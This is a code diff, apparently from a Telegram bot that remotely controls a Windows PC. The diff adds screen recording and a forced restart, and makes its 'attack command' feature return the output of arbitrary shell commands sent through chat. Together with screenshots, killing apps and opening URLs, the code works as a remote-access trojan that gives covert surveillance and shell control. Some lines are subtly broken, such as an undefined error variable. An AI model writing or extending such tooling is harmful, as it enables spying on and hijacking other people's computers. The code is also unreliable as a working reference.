@@ -20,12 +20,14 @@ bot.command("menu", (ctx) => {
   ctx.reply("Menu:", {
     reply_markup: {
       inline_keyboard: [
-        [{ text: "Shutdown 🤜🏻", callback_data: "option1" }],
         [{ text: "Screenshot 👁", callback_data: "option2" }],
         [{ text: "Killapp 👩‍💻", callback_data: "option3" }],
         [{ text: "open url 👩", callback_data: "option4" }],
         [{ text: "attack command 💽", callback_data: "option5" }],
         [{ text: "application list 💻", callback_data: "option6" }],
+        [{ text: "record screen ⏺", callback_data: "option8" }],
+        [{ text: "Shutdown ❌", callback_data: "option1" }],
+        [{ text: "restart ⭕️", callback_data: "option7" }],
       ],
     },
   });
@@ -53,11 +55,21 @@ bot.command("menu", (ctx) => {
       waitingForInput[ctx.from.id] = "cmd";
     });
     bot.action("option6", async (ctx) => {
-      ctx.reply("all aplication");
       try {
         await Methods.writeAndSend(ctx);
       } catch (error) {
         ctx.reply(`lỗi khi thực thi: ${e.message} `);
+      }
+    });
+    bot.action("option7", async (ctx) => {
+      await Methods.executeCommand("shutdown /r /t 5");
+      ctx.reply("khởi động lại thành công");
+    });
+    bot.action("option8", async (ctx) => {
+      try {
+        await Methods.recordScreen(ctx);
+      } catch (error) {
+        console.log(error);
       }
     });
 
@@ -85,8 +97,8 @@ bot.command("menu", (ctx) => {
             break;
           case "cmd":
             try {
-              await Methods.attack(ctx.message.text);
-              ctx.reply("Chạy thành công");
+              const result = await Methods.attack(ctx.message.text);
+              ctx.reply(`chạy thành công: `, result);
             } catch (error) {
               ctx.reply(`Lỗi khi thực thi: ${error.message}`);
             }
